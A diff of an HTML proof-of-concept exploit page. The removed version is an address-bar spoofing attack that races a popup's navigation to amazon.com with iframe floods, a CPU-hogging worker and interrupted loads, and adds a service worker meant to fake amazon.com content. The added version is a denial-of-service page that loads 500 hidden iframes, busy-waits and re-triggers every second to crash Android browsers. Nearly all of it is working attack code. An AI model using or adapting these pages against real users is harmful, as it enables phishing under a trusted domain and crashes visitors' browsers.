@@ -1,82 +1,28 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Enhanced Spoof PoC</title>
-  </head>
-  <body>
-    <a id="test" href="https://www.amazon.com/" onclick="foo()"
-      >Spoof</a
-    >
-  </body>
-  <script>
-    var w;
-    var animationFrameId;
-
-    if (location.href.indexOf("fake") !== -1) {
-      document.body.innerHTML =
-        "<h1>This website has moved to http://fake.com</h1>";
-    }
-
-    function foo() {
-      document.getElementById("test").href = "#";
-      w = window.open("?fake");
-      // Use requestAnimationFrame instead of setInterval for better sync with render cycle
-      animationFrameId = requestAnimationFrame(bar);
-    }
-
-    function bar() {
-      if (w.location.href !== "about:blank") {
-        alert("Redirecting");
-        document.body.innerHTML = "<h1>Redirecting</h1>";
-        slow();
-        w.location.href = "https://www.amazon.com/";
-        // Start baz with requestAnimationFrame
-        animationFrameId = requestAnimationFrame(baz);
-      } else {
-        // Continue looping if not ready
-        animationFrameId = requestAnimationFrame(bar);
-      }
-    }
-
-    function baz() {
-      try {
-        w.location.href !== "about:blank";
-        // Continue checking
-        animationFrameId = requestAnimationFrame(baz);
-      } catch (e) {
-        // Simulate tab switch to exploit occlusion
-        w.blur();
-        setTimeout(() => w.focus(), 50); // Short delay to mimic switch
-
-        // Stop page loading with slower 204 endpoint
-        w.location.href = "https://httpstat.us/204?sleep=200"; // Slower alternative for wider race window
-
-        // Chain interruption with data URI for additional no-paint force
-        setTimeout(() => {
-          w.location.href = "data:text/html,<h1>Blank</h1>";
-        }, 100);
-
-        // Cancel animation frame
-        cancelAnimationFrame(animationFrameId);
-      }
-    }
-
-    // Enhanced slowdown: More iframes + CPU-intensive loop with Web Worker
-    function slow() {
-      for (let i = 0; i < 1000; i++) {
-        // Increased to 100 iframes for heavier load
+<head>
+    <title>Crash PoC Onload</title>
+</head>
+<body onload="triggerCrash()">
+    <h1>Loading... (Will Crash on Android)</h1>
+</body>
+<script>
+// Function to cause OOM crash via heavy iframes and CPU hog
+function triggerCrash() {
+    // Increase iframes to 500 for guaranteed OOM on Android
+    for (let i = 0; i < 500; i++) {
         let iframe = document.createElement("iframe");
-        iframe.src = "https://www.amazon.com/"; // Or use a heavier site if needed
-        iframe.style = "display:none";
+        iframe.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ'; // Heavier: YouTube video embed for more memory pressure (videos + scripts)
+        iframe.style = 'display:none';
         document.body.appendChild(iframe);
-      }
-
-      // Web Worker for multi-threaded CPU hog to widen race window
-      const workerCode = `
+    }
+    
+    // Web Worker for CPU hog (extended to 500ms)
+    const workerCode = `
         onmessage = () => {
             let a = 0, b = 1;
             const start = performance.now();
-            while (performance.now() - start < 200) {
+            while (performance.now() - start < 500) {
                 let c = a + b;
                 a = b;
                 b = c;
@@ -84,42 +30,22 @@
             postMessage('done');
         };
     `;
-      const blob = new Blob([workerCode], { type: "application/javascript" });
-      const worker = new Worker(URL.createObjectURL(blob));
-      worker.postMessage("start");
-      worker.onmessage = () => worker.terminate(); // Terminate after ~200ms
+    const blob = new Blob([workerCode], {type: 'application/javascript'});
+    const worker = new Worker(URL.createObjectURL(blob));
+    worker.postMessage('start');
+    worker.onmessage = () => worker.terminate();
+    
+    // Busy-wait to block main thread (extended for ANR)
+    let start = performance.now();
+    while (performance.now() - start < 200) {} // 200ms block
+    
+    // Optional: Recursive call for infinite load (permanen until crash)
+    setTimeout(triggerCrash, 1000); // Re-trigger every second for persistent pressure
+}
 
-      // Additional busy-wait fallback
-      let start = performance.now();
-      while (performance.now() - start < 100) {} // ~100ms busy-wait
-    }
-
-    // Optional: Service Worker for persistent cache (requires server setup or local testing)
-    // If testing locally, save this as sw.js and register
-    if ("serviceWorker" in navigator && location.href.indexOf("fake") === -1) {
-      navigator.serviceWorker
-        .register(
-          URL.createObjectURL(
-            new Blob(
-              [
-                `
-        self.addEventListener('fetch', event => {
-            if (event.request.url.includes('amazon.com')) {
-                event.respondWith(new Response('<h1>Fake Cached Content</h1>', {
-                    headers: {'Content-Type': 'text/html'}
-                }));
-            }
-        });
-    `,
-              ],
-              { type: "application/javascript" }
-            )
-          )
-        )
-        .then((reg) => {
-          console.log("SW registered");
-        })
-        .catch((err) => console.error("SW error", err));
-    }
-  </script>
+// Optional: Run immediately if no onload needed
+if (location.href.indexOf("fake") !== -1) {
+    triggerCrash(); // For popup variant
+}
+</script>
 </html>
